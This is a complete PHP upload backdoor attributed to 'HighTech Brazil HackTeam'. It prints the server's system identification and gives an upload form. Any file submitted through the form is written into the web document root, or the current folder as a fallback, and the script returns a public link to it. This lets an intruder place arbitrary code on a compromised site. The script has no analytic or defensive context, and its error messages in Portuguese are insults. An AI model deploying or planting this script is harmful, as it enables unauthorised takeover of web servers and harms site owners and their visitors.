<?php
echo "<b><i>HighTech Brazil HackTeam</b></i><br>";
echo "<b>".php_uname()."</b><br>";

echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='updlf'>
	  <input type='submit' name='upload' value='upload'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['updlf']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['updlf']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "Link -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "Tenta de Novo Arrombado :(";
		}
	} else {
		if(@copy($_FILES['updlf']['tmp_name'], $files)) {
			echo "Arquivo: <b>$files</b> have been uploaded in the same folder";
		} else {
			echo "Morto pela Escola";
		}
	}
}
?>